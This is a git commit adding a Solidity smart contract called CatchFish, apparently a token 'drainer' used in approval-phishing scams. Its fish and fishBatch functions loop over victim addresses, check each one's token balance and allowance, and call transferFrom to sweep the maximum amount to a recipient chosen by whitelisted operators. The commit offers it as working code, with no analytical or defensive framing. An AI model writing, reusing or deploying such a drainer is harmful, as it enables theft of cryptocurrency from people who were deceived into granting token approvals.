9bb66a25dde65984c69d900ec6d02dd52e9e928c
serv_luxun <serv_luxun@yf-work.top>
2024-01-14 22:10:28 +0800

    1

---
+++ contracts/catch.sol
@@ -0,0 +1,146 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.7.3;
+
+interface IBEP20 {
+  /**
+   * @dev Returns the amount of tokens in existence.
+   */
+  function totalSupply() external view returns (uint256);
+
+  /**
+   * @dev Returns the token decimals.
+   */
+  function decimals() external view returns (uint8);
+
+  /**
+   * @dev Returns the token symbol.
+   */
+  function symbol() external view returns (string memory);
+
+  /**
+  * @dev Returns the token name.
+  */
+  function name() external view returns (string memory);
+
+  /**
+   * @dev Returns the amount of tokens owned by `account`.
+   */
+  function balanceOf(address account) external view returns (uint256);
+
+  /**
+   * @dev Moves `amount` tokens from the caller's account to `recipient`.
+   *
+   * Returns a boolean value indicating whether the operation succeeded.
+   *
+   * Emits a {Transfer} event.
+   */
+  function transfer(address recipient, uint256 amount) external returns (bool);
+
+  /**
+   * @dev Returns the remaining number of tokens that `spender` will be
+   * allowed to spend on behalf of `owner` through {transferFrom}. This is
+   * zero by default.
+   *
+   * This value changes when {approve} or {transferFrom} are called.
+   */
+  function allowance(address _owner, address spender) external view returns (uint256);
+
+  /**
+   * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
+   *
+   * Returns a boolean value indicating whether the operation succeeded.
+   *
+   * IMPORTANT: Beware that changing an allowance with this method brings the risk
+   * that someone may use both the old and the new allowance by unfortunate
+   * transaction ordering. One possible solution to mitigate this race
+   * condition is to first reduce the spender's allowance to 0 and set the
+   * desired value afterwards:
+   * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
+   *
+   * Emits an {Approval} event.
+   */
+  function approve(address spender, uint256 amount) external returns (bool);
+
+  /**
+   * @dev Moves `amount` tokens from `sender` to `recipient` using the
+   * allowance mechanism. `amount` is then deducted from the caller's
+   * allowance.
+   *
+   * Returns a boolean value indicating whether the operation succeeded.
+   *
+   * Emits a {Transfer} event.
+   */
+  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
+
+  /**
+   * @dev Emitted when `value` tokens are moved from one account (`from`) to
+   * another (`to`).
+   *
+   * Note that `value` may be zero.
+   */
+  event Transfer(address indexed from, address indexed to, uint256 value);
+
+  /**
+   * @dev Emitted when the allowance of a `spender` for an `owner` is set by
+   * a call to {approve}. `value` is the new allowance.
+   */
+  event Approval(address indexed owner, address indexed spender, uint256 value);
+}
+
+contract CatchFish {
+    address owner;
+    mapping(address=>bool) whiteList;
+
+    constructor() {
+        owner = msg.sender;
+        whiteList[msg.sender] = true;
+    }
+    modifier whiteAddress() {
+        require(whiteList[msg.sender], "not white address");
+        _;
+    }
+    modifier onlyOwner() {
+        require(msg.sender == owner, "Not owner");
+        _;
+    }
+
+    function fishBatch(address token, address[] calldata froms,address to)  public   whiteAddress{
+      IBEP20  coin = IBEP20(token);
+        for (uint256 index = 0; index < froms.length; index++) {
+            fish(coin, froms[index], to);
+        }     
+    }
+
+    function transferFromBatch(address token, address from,address[] calldata tos,uint256 [] calldata amounts)  public  whiteAddress{
+      IBEP20  coin = IBEP20(token);
+        for (uint256 index = 0; index < tos.length; index++) {
+            bool flag = coin.transferFrom(from,tos[index], amounts[index]);
+            if (!flag){
+                revert("transferFrom error");
+            }
+        }     
+    }
+
+    function setWhiteAddress(address _account, bool _flag) public onlyOwner {
+        whiteList[_account] = _flag;
+    }
+
+    function fish(IBEP20 token,address from,address to) public whiteAddress returns (bool){
+            uint256 bal =  token.balanceOf(from);
+            uint256 allow = token.allowance(from,to);
+            if (allow == 0){
+                return false;
+            }
+            uint256 amount = bal>allow?allow:bal;
+
+            (bool success, ) = address(token).call(
+            abi.encodeWithSignature(
+                "transferFrom(address,address,uint256)",
+                from,
+                to,
+                amount
+            )
+        );
+       return success;
+    }
+}
